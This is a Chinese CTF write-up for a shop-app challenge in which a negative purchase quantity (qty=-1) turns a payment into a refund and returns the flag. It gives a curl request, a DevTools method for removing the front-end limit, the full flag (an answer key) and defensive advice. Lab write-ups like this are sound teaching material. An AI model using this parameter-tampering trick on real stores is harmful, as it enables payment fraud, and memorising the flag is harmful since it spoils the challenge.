# 32 · Logic Payment Negative

> 业务逻辑漏洞 · 负数数量绕过支付

## 题目

- 入口：`http://47.120.76.57:34940`
- 应用：MiniShop，初始余额 ¥100
- 商品：可乐 ¥5、iPhone ¥9999、机密物料(flag) ¥100000
- 接口：`POST /buy`，参数 `item`、`qty`，成功买到 `flag` 商品即返回 flag

## 思路

服务端大概率写成：

```php
$total = $price * $qty;
$balance -= $total;
if ($balance >= 0) { 发货; }
```

只校验「扣款后余额 ≥ 0」，没校验 `qty > 0`。
当 `qty = -1` 时 `$total = -100000`，余额变成 `100 - (-100000) = 100100`，校验通过，且依然按"成功购买 flag"的分支返回 flag。

一句话：**让支付变退款。**

## 手工复刻（curl 一发入魂）

```bash
curl -s -X POST http://47.120.76.57:34940/buy \
     -d 'item=flag&qty=-1'
```

返回：

```json
{"ok":true,"balance":100100,"bought":"机密物料","qty":-1,
 "total":-100000,"flag":"TOGOGO-flag{...}"}
```

## 浏览器手工版

1. 打开首页，F12 → Network。
2. 把"机密物料"那一行数量框里的 `1` 改成 `-1`，点购买。
3. 在 Network 里看 `/buy` 的响应，`flag` 字段就是答案。

> 如果前端做了 `min=1` 限制，直接用 DevTools 删掉属性，或者用上面 curl。

## 一键脚本

```bash
python3 main.py
# 或指定地址
python3 main.py http://47.120.76.57:34940
```

## Flag

```
TOGOGO-flag{4cf71b76-8c20-4705-9108-fb9d7d41f25e}
```

## 防御建议

- 所有数量/金额参数强制 `int` 且 `> 0`。
- 价格、库存、扣款在**服务端事务**里完成，不要相信前端。
- 关键资源发放前再校验一次「实际支付金额 ≥ 标价 × 数量 且数量 ≥ 1」。
